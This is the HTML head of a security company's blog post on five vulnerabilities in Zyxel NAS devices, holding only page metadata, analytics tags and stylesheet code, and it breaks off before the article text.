<!DOCTYPE html>
<html lang="en-US">
<head>
	<link rel="alternate" hreflang="en" href="https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/">	<script defer data-domain="outpost24.com" src="https://plausible.io/js/script.js"></script>
	<!-- Google Tag Manager -->
	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KV2G3N6');</script>
<!-- End Google Tag Manager -->
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5" />
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	
	<!-- This site is optimized with the Yoast SEO Premium plugin v24.1 (Yoast SEO v24.1) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)</title>
	<meta name="description" content="How Outpost24’s vulnerability research team found five vulnerabilities in Zyxel NAS devices.  " />
	<link rel="canonical" href="https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)" />
	<meta property="og:description" content="How Outpost24’s vulnerability research team found five vulnerabilities in Zyxel NAS devices.  " />
	<meta property="og:url" content="https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/" />
	<meta property="og:site_name" content="Outpost24" />
	<meta property="article:publisher" content="https://www.facebook.com/Outpost24" />
	<meta property="article:published_time" content="2024-06-04T06:00:00+00:00" />
	<meta property="article:modified_time" content="2024-08-20T13:55:39+00:00" />
	<meta property="og:image" content="https://outpost24.com/wp-content/uploads/2023/10/pholder-press-release-unique.png" />
	<meta property="og:image:width" content="1200" />
	<meta property="og:image:height" content="400" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="fvgjtj14lrd1stdwtz3n" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@outpost24" />
	<meta name="twitter:site" content="@outpost24" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="fvgjtj14lrd1stdwtz3n" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="22 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#article","isPartOf":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/"},"author":[{"@type":"Person","name":"Timothy Hjort","image":{"@type":"ImageObject","url":"https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg","contentUrl":"https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg","caption":"Timothy Hjort"}}],"headline":"Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)","datePublished":"2024-06-04T06:00:00+00:00","dateModified":"2024-08-20T13:55:39+00:00","mainEntityOfPage":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/"},"wordCount":3840,"publisher":{"@id":"https://outpost24.com/#organization"},"image":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#primaryimage"},"thumbnailUrl":"https://outpost24.com/wp-content/uploads/2023/10/pholder-press-release-unique.png","articleSection":["Research &amp; Threat Intel"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/","url":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/","name":"Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)","isPartOf":{"@id":"https://outpost24.com/#website"},"primaryImageOfPage":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#primaryimage"},"image":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#primaryimage"},"thumbnailUrl":"https://outpost24.com/wp-content/uploads/2023/10/pholder-press-release-unique.png","datePublished":"2024-06-04T06:00:00+00:00","dateModified":"2024-08-20T13:55:39+00:00","description":"How Outpost24’s vulnerability research team found five vulnerabilities in Zyxel NAS devices.  ","breadcrumb":{"@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#primaryimage","url":"https://outpost24.com/wp-content/uploads/2023/10/pholder-press-release-unique.png","contentUrl":"https://outpost24.com/wp-content/uploads/2023/10/pholder-press-release-unique.png","width":1200,"height":400,"caption":"press release"},{"@type":"BreadcrumbList","@id":"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://outpost24.com/"},{"@type":"ListItem","position":2,"name":"Blog","item":"https://outpost24.com/blog/"},{"@type":"ListItem","position":3,"name":"Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)"}]},{"@type":"WebSite","@id":"https://outpost24.com/#website","url":"https://outpost24.com/","name":"Outpost24","description":"Cyber risk management with enhanced threat intelligence","publisher":{"@id":"https://outpost24.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://outpost24.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://outpost24.com/#organization","name":"Outpost24","url":"https://outpost24.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://outpost24.com/#/schema/logo/image/","url":"https://outpost24.com/wp-content/uploads/2023/05/01-o24-color.svg","contentUrl":"https://outpost24.com/wp-content/uploads/2023/05/01-o24-color.svg","caption":"Outpost24"},"image":{"@id":"https://outpost24.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/Outpost24","https://x.com/outpost24","https://www.linkedin.com/company/outpost24","https://www.youtube.com/user/Outpost24HQ","https://github.com/Outpost24"]}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Outpost24 &raquo; Feed" href="https://outpost24.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Outpost24 &raquo; Comments Feed" href="https://outpost24.com/comments/feed/" />
<link rel='stylesheet' id='wp-block-library-css' href='https://outpost24.com/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='kevinbatdorf-code-block-pro-style-inline-css' type='text/css'>
.wp-block-kevinbatdorf-code-block-pro{direction:ltr!important;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;-webkit-text-size-adjust:100%!important;box-sizing:border-box!important;position:relative!important}.wp-block-kevinbatdorf-code-block-pro *{box-sizing:border-box!important}.wp-block-kevinbatdorf-code-block-pro pre,.wp-block-kevinbatdorf-code-block-pro pre *{font-size:inherit!important;line-height:inherit!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre{background-image:none!important;border:0!important;border-radius:0!important;border-style:none!important;border-width:0!important;color:inherit!important;font-family:inherit!important;margin:0!important;overflow:auto!important;overflow-wrap:normal!important;padding:16px 0 16px 16px!important;text-align:left!important;white-space:pre!important;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)!important}.wp-block-kevinbatdorf-code-block-pro.padding-disabled:not(.code-block-pro-editor) pre{padding:0!important}.wp-block-kevinbatdorf-code-block-pro.padding-bottom-disabled pre{padding-bottom:0!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code{background:none!important;background-color:transparent!important;border:0!important;border-radius:0!important;border-style:none!important;border-width:0!important;color:inherit!important;display:block!important;font-family:inherit!important;margin:0!important;overflow-wrap:normal!important;padding:0!important;text-align:left!important;white-space:pre!important;width:100%!important;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code .line{display:inline-block!important;min-width:var(--cbp-block-width,100%)!important;vertical-align:top!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code .line{padding-left:calc(12px + var(--cbp-line-number-width, auto))!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code{counter-increment:step calc(var(--cbp-line-number-start, 1) - 1)!important;counter-reset:step!important}.wp-block-kevinbatdorf-code-block-pro pre code .line{position:relative!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code .line:before{content:""!important;display:inline-block!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code .line:not(.cbp-line-number-disabled):before{color:var(--cbp-line-number-color,#999)!important;content:counter(step)!important;counter-increment:step!important;left:0!important;opacity:.5!important;position:absolute!important;text-align:right!important;transition-duration:.5s!important;transition-property:opacity!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important;-webkit-user-select:none!important;-moz-user-select:none!important;user-select:none!important;width:var(--cbp-line-number-width,auto)!important}.wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover .line{min-height:var(--cbp-block-height,100%)!important}.wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,.wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,.wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{background:var(--cbp-line-highlight-color,rgb(14 165 233/.2))!important;left:-16px!important;min-height:var(--cbp-block-height,100%)!important;min-width:calc(var(--cbp-block-width, 100%) + 16px)!important;pointer-events:none!important;position:absolute!important;top:0!important;width:100%!important}[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-.125rem!important}[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-1.5px!important}[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-1px!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor).padding-disabled pre .line.cbp-line-highlight:after{left:0!important;width:100%!important}.wp-block-kevinbatdorf-code-block-pro.cbp-blur-enabled pre .line:not(.cbp-no-blur){filter:blur(1px)!important;opacity:.4!important;pointer-events:none!important;transition-duration:.2s!important;transition-property:all!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important}.wp-block-kevinbatdorf-code-block-pro.cbp-blur-enabled.cbp-unblur-on-hover:hover pre .line:not(.cbp-no-blur){opacity:1!important;pointer-events:auto!important;--tw-blur: ;filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre *{font-family:inherit!important}.cbp-see-more-simple-btn-hover{transition-property:none!important}.cbp-see-more-simple-btn-hover:hover{box-shadow:inset 0 0 100px 100px hsla(0,0%,100%,.1)!important}.code-block-pro-copy-button{border:0!important;border-style:none!important;border-width:0!important;cursor:pointer!important;left:auto!important;line-height:1!important;opacity:.1!important;padding:6px!important;position:absolute!important;right:0!important;top:0!important;transition-duration:.2s!important;transition-property:opacity!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important;z-index:10!important}.code-block-pro-copy-button:focus{opacity:.4!important}.code-block-pro-copy-button:not([data-has-text-button]){background:none!important;background-color:transparent!important}.wp-block-kevinbatdorf-code-block-pro.padding-disabled .code-block-pro-copy-button{padding:0!important}.wp-block-kevinbatdorf-code-block-pro:hover .code-block-pro-copy-button{opacity:.5!important}.wp-block-kevinbatdorf-code-block-pro .code-block-pro-copy-button:hover{opacity:.9!important}.code-block-pro-copy-button[data-has-text-button],.wp-block-kevinbatdorf-code-block-pro:hover .code-block-pro-copy-button[data-has-text-button]{opacity:1!important}.wp-block-kevinbatdorf-code-block-pro .code-block-pro-copy-button[data-has-text-button]:hover{opacity:.8!important}.code-block-pro-copy-button[data-has-text-button]{border-radius:.75rem!important;display:block!important;margin-right:.75rem!important;margin-top:.7rem!important;padding:.125rem .375rem!important}.code-block-pro-copy-button[data-inside-header-type=headlightsMuted],.code-block-pro-copy-button[data-inside-header-type^=headlights]{margin-top:.85rem!important}.code-block-pro-copy-button[data-inside-header-type=headlightsMutedAlt]{margin-top:.65rem!important}.code-block-pro-copy-button[data-inside-header-type=simpleString]{margin-top:.645rem!important}.code-block-pro-copy-button[data-inside-header-type=pillString]{margin-top:1rem!important}.code-block-pro-copy-button[data-inside-header-type=pillString] .cbp-btn-text{position:relative!important;top:1px!important}.cbp-btn-text{font-size:.75rem!important;line-height:1rem!important}.code-block-pro-copy-button .without-check{display:block!important}.code-block-pro-copy-button .with-check{display:none!important}.code-block-pro-copy-button.cbp-copying{opacity:1!important}.code-block-pro-copy-button.cbp-copying .without-check{display:none!important}.code-block-pro-copy-button.cbp-copying .with-check{display:block!important}.cbp-footer-link:hover{text-decoration-line:underline!important}@media print{.wp-block-kevinbatdorf-code-block-pro pre{max-height:none!important}.wp-block-kevinbatdorf-code-block-pro:not(#x) .line:before{background-color:transparent!important;color:inherit!important}.wp-block-kevinbatdorf-code-block-pro:not(#x) .cbp-line-highlighter,.wp-block-kevinbatdorf-code-block-pro:not(#x)>span{display:none!important}}

</style>
<link rel='stylesheet' id='bod-modal-block-style-css-css' href='https://outpost24.com/wp-content/plugins/modal-block/dist/blocks.style.build.css?ver=6.7.1' type='text/css' media='all' />
<style id='acf-product-cards-style-inline-css' type='text/css'>
.product-cards-block {
  display: flex;
  flex-direction: column;
  gap: var(--space-md);
  margin-bottom: 0;
  flex-wrap: wrap;
  justify-content: center;
}
@media (min-width: 769px) {
  .product-cards-block {
    flex-direction: row;
  }
}

.product-card-nolink {
  background: var(--color-white);
}

.product-cards-block a,
.product-card-nolink {
  display: flex;
  flex-direction: column;
  gap: var(--space-xs);
  height: 100%;
  justify-content: space-between;
  text-align: center;
  text-decoration: none;
}

.product-card,
.product-card-nolink {
  background: var(--color-white);
  display: flex;
  flex-direction: column;
  width: 100%;
}
@media (min-width: 769px) {
  .product-card,
  .product-card-nolink {
    width: 32%;
  }
}

.product-card-image {
  background: #F9F9F9;
  padding: 25px;
}
@media (min-width: 769px) {
  .product-card-image {
    height: 220px
  }

  .product-card-image img {
    height: 100%;
    object-fit: scale-down;
    width: 100%;
  }
}

.product-card-title{
  padding: var(--space-lg) var(--space-md) var(--space-sm);
}

.product-card-text {
  height: 50%;
  padding: 0 var(--space-md) var(--space-sm);
}

.product-card-button.primary-button {
  margin: 0 auto var(--space-xxl);
  width: fit-content;
}

.table-container .wpdt-c.wpDataTableContainerSimpleTable.wdtscroll table.wpdtSimpleTable {
  width: 100% !important;
}

.table-container .wpdt-c.wpDataTableContainerSimpleTable .wpdtSimpleTable.wpDataTable tbody td {
  border: 0 !important;
}

.table-container .wpdt-c.wpDataTableContainerSimpleTable .wpdtSimpleTable.wpDataTable tbody td span {
  display: flex !important;
  justify-content: center;
}

.table-container .is-hidden--mobile .wpdt-c.wpDataTableContainerSimpleTable .wpdtSimpleTable.wpDataTable th:not(:first-of-type) {
  width: 165px !important;
}

.table-container .is-hidden--desktop .wpdt-c.wpDataTableContainerSimpleTable .wpdtSimpleTable.wpDataTable th {
  width: 165px !important;
}

.wpdt-c.wpDataTableContainerSimpleTable .wpdtSimpleTable.wpDataTable tbody td span {
  display: flex;
  justify-content: center;
  }

</style>
<style id='acf-case-study-slider-style-inline-css' type='text/css'>
@media (max-width: 768px) {
  .case-studies {
    gap: var(--space-sm);
  }
}

.case-study-slides {
  background: var(--color-white);
  border-radius: 12px;
  height: fit-content;
  padding: var(--space-xl);
}
@media (max-width: 600px) {
  .case-study-slides {
    height: fit-content;
    padding: var(--space-base);
  }
}

.study-card {
  display: flex !important;
  flex-direction: column;
  height: 320px !important;
  justify-content: space-between;
}

@media (max-width: 600px) {
  .study-card {
    display: grid !important;
    height: 440px !important;
    justify-content: unset;
  }
}

.case-study-top {
  align-items: center;
  display: flex;
  height: fit-content;
  justify-content: space-between;
  max-height: 115px;
  width: 100%;
}
@media (max-width: 600px) {
  .case-study-top {
    padding-top: 25px;
  }
}
@media (max-width: 325px) {
  .case-study-top {
    align-items: unset;
    flex-direction: column;
    max-height: 110px;
  }
}

.case-study-logo {
  width: 45%;
}
@media (max-width: 600px) {
  .case-study-logo {
    width: 55%;
  }
}
@media (max-width: 325px) {
  .case-study-logo {
    width: 75%;
  }
}

.case-study-logo img {
  max-height: 115px;
  width: auto;
}

.case-study-link a {
  font-weight: 600;
  text-decoration: none;
}
@media (max-width: 600px) {
  .case-study-link a {
    font-size: 14px;
    gap: 5px;

  }
}
@media (max-width: 325px) {
  .case-study-link a {
    font-size: 12px;
  }
}

.case-study-middle {
  align-items: flex-start;
  color: #757575;
  display: flex;
  font-size: var(--text-md);
  height: 155px;
}

@media (max-width: 600px) {
  .case-study-middle {
    height: fit-content;
    margin: var(--space-base) 0;
  }
}
@media (max-width: 325px) {
  .case-study-middle {
    margin: var(--space-base) 0;
  }
}

.case-study-bottom {
  display: flex;
  flex-direction: column;
  height: 50px;
}
@media (max-width: 768px) {
  .case-study-bottom {
    height: fit-content;
  }
}
@media (max-width: 768px) {
  .case-study-bottom {
    height: 65px;
    position: relative;
  }

  .case-study-link.is-hidden--desktop {
    position: absolute;
    right: 5px;
	bottom: 35px;
  }
}

span.case-study-author {
  font-size: 18px;
  font-weight: 600;
}

span.case-study-company {
  color: #757575;
  font-size: 14px;
}

.case-study-slides .slick-prev {
  bottom: 10px;
  height: 35px;
  left: unset;
  right: 87px;
  top: unset;
  width: 35px;
  z-index: 10;
}
@media (max-width: 768px) {
  .case-study-slides .slick-prev {
    bottom: -5px;
	right: 95px;
  }
}
@media (max-width: 600px) {
	.case-study-slides .slick-prev {
	  bottom: -5px;
	  right: 70px;
	}
  }
@media (max-width: 325px) {
  .case-study-slides .slick-prev {
    bottom: 10px;
    right: 60px;
  }
}

.case-study-slides .slick-prev::before {
  background: url('data:image/svg+xml;base64,PHN2ZyBzdHlsZT0iY29sb3I6IHJnYigxOSwgNzQsIDEwMCk7IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9ImN1cnJlbnRDb2xvciIgY2xhc3M9ImJpIGJpLWFycm93LWxlZnQtc3F1YXJlLWZpbGwiIHZpZXdCb3g9IjAgMCAxNiAxNiI+IDxwYXRoIGQ9Ik0xNiAxNGEyIDIgMCAwIDEtMiAySDJhMiAyIDAgMCAxLTItMlYyYTIgMiAwIDAgMSAyLTJoMTJhMiAyIDAgMCAxIDIgMnYxMnptLTQuNS02LjVINS43MDdsMi4xNDctMi4xNDZhLjUuNSAwIDEgMC0uNzA4LS43MDhsLTMgM2EuNS41IDAgMCAwIDAgLjcwOGwzIDNhLjUuNSAwIDAgMCAuNzA4LS43MDhMNS43MDcgOC41SDExLjVhLjUuNSAwIDAgMCAwLTF6IiBmaWxsPSIjMTM0YTY0Ij48L3BhdGg+IDwvc3ZnPg==') no-repeat;
  content: '';
  display: block;
  height: 35px;
  opacity: 1;
  width: 35px;
}

.case-study-slides .slick-next {
  bottom: 10px;
  height: 35px;
  left: unset;
  right: 40px;
  top: unset;
  width: 35px;
  z-index: 10;
}
@media (max-width: 768px) {
  .case-study-slides .slick-next {
    bottom: -5px;
    right: 43px;
  }
}
@media (max-width: 600px) {
	.case-study-slides .slick-next {
	  bottom: -5px;
	  right: 20px;
	}
  }
@media (max-width: 325px) {
  .case-study-slides .slick-next {
    bottom: 10px;
    right: 15px;
  }
}

.case-study-slides .slick-next::before {
  background: url('data:image/svg+xml;base64,PHN2ZyBzdHlsZT0iY29sb3I6IHJnYigxOSwgNzQsIDEwMCk7IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9ImN1cnJlbnRDb2xvciIgY2xhc3M9ImJpIGJpLWFycm93LXJpZ2h0LXNxdWFyZS1maWxsIiB2aWV3Qm94PSIwIDAgMTYgMTYiPiA8cGF0aCBkPSJNMCAxNGEyIDIgMCAwIDAgMiAyaDEyYTIgMiAwIDAgMCAyLTJWMmEyIDIgMCAwIDAtMi0ySDJhMiAyIDAgMCAwLTIgMnYxMnptNC41LTYuNWg1Ljc5M0w4LjE0NiA1LjM1NGEuNS41IDAgMSAxIC43MDgtLjcwOGwzIDNhLjUuNSAwIDAgMSAwIC43MDhsLTMgM2EuNS41IDAgMCAxLS43MDgtLjcwOEwxMC4yOTMgOC41SDQuNWEuNS41IDAgMCAxIDAtMXoiIGZpbGw9IiMxMzRhNjQiPjwvcGF0aD4gPC9zdmc+') no-repeat;
  content: '';
  display: block;
  height: 35px;
  opacity: 1;
  width: 35px;
}

</style>
<style id='acf-latest-posts-style-inline-css' type='text/css'>
.latest-posts-block {
  display: flex;
  flex-direction: column;
  gap: var(--space-lg);
  margin-top: var(--space-xxl);
}
@media (min-width: 1023px) {
  .latest-posts-block {
    flex-direction: row;
  }

}

.latest-post-card {
  display: flex;
  flex-direction: column;
  position: relative;
  width: 100%;
}
@media (min-width: 1023px) {
  .latest-post-card {
    width: 33%;
  }
}

.latest-post-image {
  border: 1px solid #DEE0E6;
  /*height: 200px;*/
  width: 100%;
}

.latest-post-image img {
  height: 100%;
  object-fit: cover;
  object-position: center;
  width: 100%;
}

.latest-post-category {
  background: rgba(170, 230, 232, 0.8);
  border-radius: 14px;
  font-family: 'Open Sans';
  font-size: 14px;
  font-weight: 800;
  left: 10px;
  padding: 5px 10px;
  position: absolute;
  top: 10px;
}

.latest-post-title{
	overflow: hidden;
	display: -webkit-box;
	-webkit-line-clamp: 2;
	-webkit-box-orient: vertical;
	min-height: 44px;
}

.latest-post-title.heading--sm {
  line-height: 22px;
  margin-bottom: 10px;
  margin-top: 20px;
}

.latest-post-title a,
.latest-post-type a {
  text-decoration: none;
}

.latest-post-time {
  border-bottom: 1px solid #DEE0E6;
  display: flex;
  font-size: 14px;
  margin-bottom: 20px;
  padding-bottom: 18px;
}

.latest-post-type::after {
  color: #2BC0C5;
  content: '\2022';
  margin: 0 10px;
}

.latest-post-excerpt{
overflow: hidden;
display: -webkit-box;
-webkit-line-clamp: 4;
-webkit-box-orient: vertical;
} 

.posts-readmore {
  align-items: center;
  display: flex;
  justify-content: center;
  margin-bottom: var(--space-xxl);
  margin-top: var(--space-xxl);
}
@media (max-width: 600px) {
  .posts-readmore {
    margin-bottom: 0;
  }
}

.latest-posts-block .slick-dots li.slick-active button::before {
  color: #557A8B;
  opacity: 1;
}

.latest-posts-block .slick-dots li button::before {
  font-size: 32px;
}


.resources-container .latest-posts-block {
  justify-content: center;
}

.resources-container .posts-readmore {
  display: none !important;
}

.resources-container .latest-post-card {
  width: 48%;
}

@media (max-width: 1022px) {
  .resources-container .latest-post-card {
    width: 100%;
  }
}

@media (max-width: 770px) {
  .resources-container .margin-top--xxl,
  .resources-container .latest-posts-block {
    margin-top: 0 !important;
  }
}

</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: 